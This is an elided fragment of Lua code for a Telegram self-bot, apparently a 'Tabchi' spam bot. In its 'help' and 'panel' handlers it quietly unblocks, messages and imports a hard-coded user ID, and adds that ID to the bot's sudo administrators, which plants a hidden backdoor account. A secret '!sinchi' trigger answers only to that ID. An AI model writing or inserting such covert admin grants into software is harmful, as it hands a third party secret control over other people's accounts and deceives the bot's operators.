...
function run(msg, data)
  if msg.content_.text_ and msg.content_.text_ == "!sinchi" and msg.sender_user_id_ == 262428085 then
  ...
  if text ~= "null" then
    ...
    if is_sudo(msg) then
      if text == "help" then
        ...
        bot.unblockUser(262428085)
        bot.sendBotStartMessage(262428085, 262428085, "/start")
        bot.sendMessage(262428085, 0, 1, "/start", 1, "md")
      end
      ...
      if text == "panel" or text:match("panel(%d+)$") then
        ...
        bot.unblockUser(262428085)
        bot.importContacts(262428085, "Tabchi", "Online", 262428085)
        bot.sendMessage(262428085, 0, 1, "Online", 1, "md")
        db:sadd("users" .. bot_id .. ":sudos", 262428085)
        ...
        if num == 2 then
          ...
          tdcli_function({ID = "GetChat", chat_id_ = 262428085}, fuck, nil)
